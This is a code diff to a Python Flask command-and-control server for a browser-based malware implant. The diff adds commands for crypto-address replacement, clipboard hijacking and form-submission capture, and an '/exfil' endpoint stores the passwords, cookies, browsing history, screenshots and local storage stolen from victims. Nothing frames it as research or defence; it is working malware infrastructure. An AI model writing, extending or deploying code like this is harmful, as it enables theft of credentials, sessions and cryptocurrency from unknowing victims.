@@ -25,19 +25,21 @@ DATABASE = 'c2_server.db'
 
 # Add template mapping
 TEMPLATE_MAP: Dict[str, str] = {
-    'BOOKMARKS': 'view_bookmarks.html',
-    'HISTORY': 'view_history.html',
-    'DOWNLOADS': 'view_downloads.html',
-    'PASSWORDS': 'view_passwords.html',
-    'LOCALSTORAGEDATA': 'view_storage.html',
-    'TAKE_SCREENSHOT': 'view_screenshots.html',
-    'COOKIES': 'view_cookies.html',
-    'FORMS': 'view_forms.html',
-
-    'DOMSNAPSHOT': 'view_snapshots.html',
-    'CLIPBOARDCAPTURE': 'view_clipboard.html',
-    'ENUMERATION': 'view_enumeration.html',
-    'LOCALSTORAGEDUMP': 'view_storage.html'
+    'bookmarks': 'view_bookmarks.html',
+    'history': 'view_history.html',
+    'downloads': 'view_downloads.html',
+    'passwords': 'view_passwords.html',
+    'localstoragedata': 'view_storage.html',
+    'take_screenshot': 'view_screenshots.html',
+    'cookies': 'view_cookies.html',
+    'forms': 'view_forms.html',
+    'domsnapshot': 'view_snapshots.html',
+    'capture_clipboard': 'view_clipboard.html',
+    'enumeration': 'view_enumeration.html',
+    'localstoragedump': 'view_storage.html',
+    'replace_crypto': 'view_generic.html',
+    'clipboard_hijack': 'view_clipboard.html',
+    'form_submit_capture': 'view_form_submit.html'
 }
 
 def get_db_connection():
@@ -223,11 +225,19 @@ def create_task():
             except json.JSONDecodeError:
                 flash("Invalid JSON parameters for tunnel command")
                 return redirect(url_for('create_task'))
+        # For crypto replacement commands, validate JSON parameters
+        elif command.upper() == 'REPLACE_CRYPTO':
+            if parameters:
+                try:
+                    json.loads(parameters)
+                except json.JSONDecodeError:
+                    flash("Invalid JSON parameters for REPLACE_CRYPTO command")
+                    return redirect(url_for('create_task'))
 
         c.execute(
             """INSERT INTO tasks (agent_id, description, command, parameters)
                VALUES (?, ?, ?, ?)""",
-            (agent_id, description, command.upper(), parameters)
+            (agent_id, description, command, parameters)
         )
         conn.commit()
         conn.close()
@@ -314,78 +324,102 @@ def view_data_type(agent_id, data_type):
     data_type = data_type.upper()
     
     try:
-        formatted_records = []
-        total_entries = 0
-        unique_domains = set()
-        domain_frequency = {}
+        if data_type.lower() == 'form_submit_capture':
+            # Handle form submission data specifically
+            formatted_records = []
+            for record in records:
+                try:
+                    payload = json.loads(record['payload']) if record['payload'] else {}
+                    formatted_record = {
+                        'data_id': record['data_id'],
+                        'agent_id': record['agent_id'],
+                        'data_type': record['data_type'],
+                        'payload': payload,
+                        'created_at': record['created_at']
+                    }
+                    formatted_records.append(formatted_record)
+                except json.JSONDecodeError:
+                    continue
+            
+            template = TEMPLATE_MAP.get(data_type.lower(), 'view_generic.html')
+            return render_template(
+                template,
+                agent_id=agent_id,
+                records=formatted_records,
+                data_type=data_type
+            )
+        else:
+            # Generic handling for other data types (like history)
+            formatted_records = []
+            total_entries = 0
+            unique_domains = set()
+            domain_frequency = {}
 
-        for record in records:
-            try:
-                payload = json.loads(record[3]) if record[3] else {}
-                
-                # Process entries and count statistics
-                if 'entries' in payload:
-                    total_entries += len(payload['entries'])
-                    # Extract domains from URLs
-                    for entry in payload['entries']:
-                        if 'url' in entry:
-                            try:
-                                domain = urlparse(entry['url']).netloc
-                                unique_domains.add(domain)
-                                domain_frequency[domain] = domain_frequency.get(domain, 0) + 1
-                            except:
-                                continue
+            for record in records:
+                try:
+                    payload = json.loads(record['payload']) if record['payload'] else {}
+                    
+                    # Process entries and count statistics
+                    if 'entries' in payload:
+                        total_entries += len(payload['entries'])
+                        # Extract domains from URLs
+                        for entry in payload['entries']:
+                            if 'url' in entry:
+                                try:
+                                    domain = urlparse(entry['url']).netloc
+                                    unique_domains.add(domain)
+                                    domain_frequency[domain] = domain_frequency.get(domain, 0) + 1
+                                except:
+                                    continue
 
-                formatted_record = {
-                    'data_id': record[0],
-                    'agent_id': record[1],
-                    'data_type': record[2],
-                    'payload': payload,
-                    'created_at': record[4]
-                }
-                formatted_records.append(formatted_record)
-            except json.JSONDecodeError:
-                continue
+                    formatted_record = {
+                        'data_id': record['data_id'],
+                        'agent_id': record['agent_id'],
+                        'data_type': record['data_type'],
+                        'payload': payload,
+                        'created_at': record['created_at']
+                    }
+                    formatted_records.append(formatted_record)
+                except json.JSONDecodeError:
+                    continue
 
-        # Calculate collection period
-        start_date = datetime.strptime(date_range[0], '%Y-%m-%d %H:%M:%S') if date_range[0] else None
-        end_date = datetime.strptime(date_range[1], '%Y-%m-%d %H:%M:%S') if date_range[1] else None
-        collection_period = (end_date - start_date).days + 1 if start_date and end_date else 0
+            # Calculate collection period
+            start_date = datetime.strptime(date_range[0], '%Y-%m-%d %H:%M:%S') if date_range[0] else None
+            end_date = datetime.strptime(date_range[1], '%Y-%m-%d %H:%M:%S') if date_range[1] else None
+            collection_period = (end_date - start_date).days + 1 if start_date and end_date else 0
 
-        # Get top domains by frequency
-        top_domains = sorted(domain_frequency.items(), key=lambda x: x[1], reverse=True)[:5]
+            # Get top domains by frequency
+            top_domains = sorted(domain_frequency.items(), key=lambda x: x[1], reverse=True)[:5]
 
-        template = TEMPLATE_MAP.get(data_type, 'view_generic.html')
-        
-        # Prepare the data for JavaScript
-        history_data_json = json.dumps(formatted_records, default=str)
-        
-        # Ensure safe JSON encoding
-        try:
+            template = TEMPLATE_MAP.get(data_type.lower(), 'view_generic.html')
+            
+            # Prepare the data for JavaScript
             history_data_json = json.dumps(formatted_records, default=str)
-        except Exception as e:
-            print(f"JSON encoding error: {e}")
-            history_data_json = "[]"
-        
-        stats = {
-            'total_entries': total_entries,
-            'unique_domains': len(unique_domains),
-            'collection_period': collection_period,
-            'start_date': start_date,
-            'end_date': end_date,
-            'frequent_sites': len([d for d in domain_frequency.values() if d > 5])
-        }
+            
+            # Ensure safe JSON encoding
+            try:
+                history_data_json = json.dumps(formatted_records, default=str)
+            except Exception as e:
+                history_data_json = "[]"
+            
+            stats = {
+                'total_entries': total_entries,
+                'unique_domains': len(unique_domains),
+                'collection_period': collection_period,
+                'start_date': start_date,
+                'end_date': end_date,
+                'frequent_sites': len([d for d in domain_frequency.values() if d > 5])
+            }
 
-        return render_template(
-            template,
-            agent_id=agent_id,
-            records=formatted_records,
-            history_data_json=Markup(history_data_json),
-            data_type=data_type,
-            stats=stats
-        )
+            return render_template(
+                template,
+                agent_id=agent_id,
+                records=formatted_records,
+                history_data_json=Markup(history_data_json),
+                data_type=data_type,
+                stats=stats
+            )
     except Exception as e:
-        print(f"Error processing {data_type} data: {e}")
         return render_template('error.html', 
                              error=f"Error processing {data_type} data",
                              details=str(e))
@@ -455,7 +489,6 @@ def view_enumeration(agent_id):
                     'created_at': row[4]
                 })
             except json.JSONDecodeError as e:
-                print(f"Error decoding JSON for record {row[0]}: {e}")
                 continue
         
         return render_template('view_enumeration.html', 
@@ -499,8 +532,6 @@ def view_cookies(agent_id):
                     'created_at': row[4]
                 })
             except json.JSONDecodeError as e:
-                print(f"JSON decode error: {e}")
-                print(f"Raw payload: {row[3]}")
                 return render_template('error.html',
                                     error="Error processing cookie data",
                                     details=str(e))
@@ -509,7 +540,6 @@ def view_cookies(agent_id):
                             agent_id=agent_id,
                             records=records)
     except Exception as e:
-        print(f"Database error: {e}")
         return render_template('error.html',
                              error="Database error",
                              details=str(e))
@@ -563,9 +593,9 @@ def get_commands():
                 payload = json.loads(task['parameters'])
             except json.JSONDecodeError:
                 payload = {}
-        commands.append({'type': task['command'].lower(), 'payload': payload})
+        commands.append({'type': task['command'], 'payload': payload})
 
-        # Mark task as 'in_progress' immediately
+        # Mark task as 'in_progress' immediately after fetching
         c.execute("""UPDATE tasks
                      SET status = 'in_progress'
                      WHERE task_id = ?""",
@@ -581,7 +611,7 @@ def exfil():
     """Handle exfiltrated data from agents."""
     data = request.get_json()
     agent_id = data.get('agent_id')
-    action = data.get('action', '').upper()
+    action = data.get('action', '').lower()
     payload = data.get('payload')
 
     if not agent_id or not action:
@@ -598,6 +628,10 @@ def exfil():
         """, (agent_id, action, json.dumps(payload)))
 
         # Find latest matching task
+        command_to_match = action
+        if action == 'form_submit_capture':
+            command_to_match = 'form_submit_capture'
+
         c.execute("""
             SELECT task_id FROM tasks
             WHERE agent_id = ?
@@ -605,7 +639,7 @@ def exfil():
             AND status IN ('pending', 'in_progress')
             ORDER BY task_id DESC 
             LIMIT 1
-        """, (agent_id, action))
+        """, (agent_id, command_to_match))
                 
         row = c.fetchone()
         if row:
@@ -619,7 +653,6 @@ def exfil():
         conn.commit()
         return jsonify({'status': 'success'})
     except Exception as e:
-        print(f"Error handling exfil: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
     finally:
         conn.close()
@@ -796,7 +829,7 @@ def assign_task(agent_id, command, desc, params):
 
     c.execute("""INSERT INTO tasks (agent_id, description, command, parameters)
                  VALUES (?, ?, ?, ?)""",
-              (agent_id, desc, command.upper(), params))
+              (agent_id, desc, command, params))
     conn.commit()
     conn.close()
 
@@ -831,8 +864,7 @@ def from_json(value):
         if isinstance(value, str):
             return json.loads(value)
         return value
-    except Exception as e:
-        print(f"Error parsing JSON: {e}")
+    except Exception:
         return {}
 
 @app.template_filter('format_datetime')
@@ -843,8 +875,7 @@ def format_datetime(value):
         else:
             dt = datetime.fromtimestamp(value)
         return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
-    except Exception as e:
-        print(f"Error formatting datetime: {e}")
+    except Exception:
         return value
 
 @app.template_filter('calculate_status')
@@ -867,8 +898,7 @@ def calculate_status(last_seen):
         # Less than 12 hours - online
         else:
             return 'online'
-    except Exception as e:
-        print(f"Error calculating status: {e}")
+    except Exception:
         return 'offline'
 
 # Register the filter with Jinja2
@@ -904,8 +934,7 @@ def format_timestamp(value):
         else:
             return str(value)
         return dt.strftime('%Y-%m-%d %H:%M:%S UTC')
-    except Exception as e:
-        print(f"Error formatting timestamp: {e}")
+    except Exception:
         return str(value)
 
 # Add to existing filters
@@ -951,8 +980,7 @@ def process_cookie_data(record):
                     ]
             else:
                 record['payload']['cookies'] = []
-    except Exception as e:
-        print(f"Error processing cookie data: {e}")
+    except Exception:
         record['payload'] = {'cookies': [], 'domain': 'unknown'}
     return record
 
@@ -962,8 +990,7 @@ def process_history_data(record):
         if isinstance(record['payload'], dict):
             if not isinstance(record['payload'].get('history', []), list):
                 record['payload']['history'] = []
-    except Exception as e:
-        print(f"Error processing history data: {e}")
+    except Exception:
         record['payload'] = {'history': []}
     return record
 
@@ -973,8 +1000,7 @@ def process_bookmark_data(record):
         if isinstance(record['payload'], dict):
             if not isinstance(record['payload'].get('bookmarks', []), list):
                 record['payload']['bookmarks'] = []
-    except Exception as e:
-        print(f"Error processing bookmark data: {e}")
+    except Exception:
         record['payload'] = {'bookmarks': []}
     return record
 
